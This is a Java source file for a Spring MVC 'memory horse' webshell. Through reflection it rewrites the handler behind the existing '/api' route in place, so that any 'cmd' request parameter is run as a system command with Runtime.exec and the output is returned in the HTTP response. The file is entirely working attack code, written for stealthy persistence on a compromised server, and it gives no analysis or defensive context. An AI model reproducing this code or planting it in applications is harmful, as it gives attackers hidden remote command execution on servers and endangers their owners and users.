package com.example.spring;

import org.springframework.core.MethodParameter;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.method.HandlerMethod;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.Map;

public class Horse {
    static final String targetPath = "/api";
    static final String text = "ok";

    public Horse() {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()
                    .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping rmhMapping = context.getBean(RequestMappingHandlerMapping.class);

            Field _mappingRegistry = AbstractHandlerMethodMapping.class.getDeclaredField("mappingRegistry");
            _mappingRegistry.setAccessible(true);
            Object mappingRegistry = _mappingRegistry.get(rmhMapping);

            Class<?>[] tempArray = AbstractHandlerMethodMapping.class.getDeclaredClasses();
            Class<?> mappingRegistryClazz = null;
            Class<?> mappingRegistrationClazz = null;
            for (Class<?> item : tempArray) {
                if (item.getName().equals(
                        "org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry"
                )) {
                    mappingRegistryClazz = item;
                }
                if (item.getName().equals(
                        "org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistration"
                )) {
                    mappingRegistrationClazz = item;
                }
            }
            if (mappingRegistryClazz != null) {
                Field _registry = mappingRegistryClazz.getDeclaredField("registry");
                _registry.setAccessible(true);

                HashMap<RequestMappingInfo, Object> registry =
                        (HashMap<RequestMappingInfo, Object>) _registry.get(mappingRegistry);
                Method targetMethod = Horse.class.getMethod("shell", String.class);

                for (Map.Entry<RequestMappingInfo, Object> entry : registry.entrySet()) {
                    if (entry.getKey().getPatternsCondition().getPatterns().contains(targetPath)) {
                        Field _handlerMethod = mappingRegistrationClazz.getDeclaredField("handlerMethod");
                        _handlerMethod.setAccessible(true);
                        HandlerMethod handlerMethod = (HandlerMethod) _handlerMethod.get(entry.getValue());

                        Field _tempMethod = handlerMethod.getClass().getDeclaredField("bridgedMethod");
                        _tempMethod.setAccessible(true);
                        Field modifiersField = Field.class.getDeclaredField("modifiers");
                        modifiersField.setAccessible(true);
                        modifiersField.setInt(_tempMethod, _tempMethod.getModifiers() & ~Modifier.FINAL);

                        _tempMethod.set(handlerMethod, targetMethod);

                        Field _bean = handlerMethod.getClass().getDeclaredField("bean");
                        _bean.setAccessible(true);
                        Field beanModifiersField = Field.class.getDeclaredField("modifiers");
                        beanModifiersField.setAccessible(true);
                        beanModifiersField.setInt(_bean, _bean.getModifiers() & ~Modifier.FINAL);

                        _bean.set(handlerMethod, new Horse("horse"));

                        Field _parameters = handlerMethod.getClass().getDeclaredField("parameters");
                        _parameters.setAccessible(true);
                        Field paramModifiersField = Field.class.getDeclaredField("modifiers");
                        paramModifiersField.setAccessible(true);
                        paramModifiersField.setInt(_parameters, _parameters.getModifiers() & ~Modifier.FINAL);

                        MethodParameter[] newParams = new MethodParameter[]{
                                new MethodParameter(targetMethod, 0)};
                        _parameters.set(handlerMethod, newParams);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Horse(String name) {
    }

    public String shell(String cmd) throws IOException {
        HttpServletResponse response = ((ServletRequestAttributes)
                (RequestContextHolder.currentRequestAttributes())).getResponse();
        try {
            if (cmd != null && !cmd.equals("")) {
                Process process = Runtime.getRuntime().exec(cmd);
                StringBuilder outStr = new StringBuilder();
                outStr.append("<pre>");
                java.io.InputStreamReader resultReader = new java.io.InputStreamReader(process.getInputStream());
                java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                String s = null;
                while ((s = stdInput.readLine()) != null) {
                    outStr.append(s).append("\n");
                }
                outStr.append("</pre>");
                response.getWriter().print(outStr);
                return outStr.toString();
            } else {
                response.getWriter().print(text);
                return text;
            }
        } catch (Exception ignored) {
        }
        response.getWriter().print(text);
        return text;
    }
}